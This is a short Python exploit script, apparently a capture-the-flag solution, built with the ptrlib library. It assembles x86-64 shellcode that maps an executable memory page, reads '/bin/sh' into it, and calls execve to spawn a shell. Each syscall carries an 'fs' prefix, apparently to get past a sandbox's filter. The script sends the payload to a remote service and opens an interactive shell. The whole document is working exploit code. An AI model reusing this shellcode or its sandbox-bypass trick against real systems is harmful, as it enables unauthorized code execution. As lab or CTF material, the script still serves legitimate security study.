from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 10001))

code = nasm("""
; p = mmap(0x77770000, 0x1000, RWX, ..., -1, 0);
xor r9d, r9d
mov r8, -1
mov r10, 0x22
mov edx, 7
mov esi, 0x1000
mov edi, 0x77770000
mov eax, 9
fs syscall

; read(0, p, 8);
mov edx, 8
mov rsi, rax
xor edi, edi
xor eax, eax
fs syscall

; execve("/bin/sh", NULL, NULL);
xor edx, edx
xor esi, esi
mov edi, 0x77770000
mov eax, 59
fs syscall

; exit(0);
xor edi, edi
mov eax, 60
syscall
""", bits=64)

#sock = Process(["python", "./sandbox.py"], cwd="../distfiles")
sock = Socket(HOST, PORT)

sock.sendlineafter("shellcode: ", code.hex())
time.sleep(1)
sock.send("/bin/sh\0")

sock.sh()
